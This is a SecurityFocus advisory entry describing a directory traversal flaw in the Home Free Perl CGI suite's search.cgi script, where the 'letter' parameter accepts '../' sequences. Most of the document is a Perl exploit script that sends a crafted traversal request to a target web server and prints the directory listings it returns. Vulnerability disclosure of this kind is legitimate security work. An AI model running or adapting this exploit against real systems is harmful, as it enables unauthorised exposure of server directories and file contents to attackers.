source: http://www.securityfocus.com/bid/921/info

Home Free is a suite of Perl cgi scripts that allow a website to support user contributions of various types. One of the scripts, search.cgi, accepts a parameter called letter which can be any text string. The supplied argument can contain the '../' string, which the script will process. This can be used to obtain directory listings and the first line of files outside of the intended web filesystem.


#!/usr/bin/perl
#
# Quick exploit of the Home Free ./search.cgi script, allows you to list
# directories on the host.
#
#

use IO::Socket;

if ($ARGV[0] eq "") { die "no argument\n"; }

$asoc = IO::Socket::INET->new(Proto     => "tcp",
                              PeerAddr  => "target.host.net",
                              PeerPort  => 80) ||
                     die "can't connect to host: $!";

select($asoc);
$| = 1;

print $asoc "GET /cgi-bin/search.cgi?letter=..\\..\\..\\..\\$ARGV[0]&start=1&perpage=all HTTP/1.0\n\n";

while(<$asoc>) {
             if ($_ =~ /.+HREF.+TD.+/) {
                     @parts = split("\"", $_);
                     $foo = $parts[1];
                     @parts = split("/", $foo);
                     print STDOUT $parts[3];
                     print STDOUT "\n";
             }
     }
close(ASOC);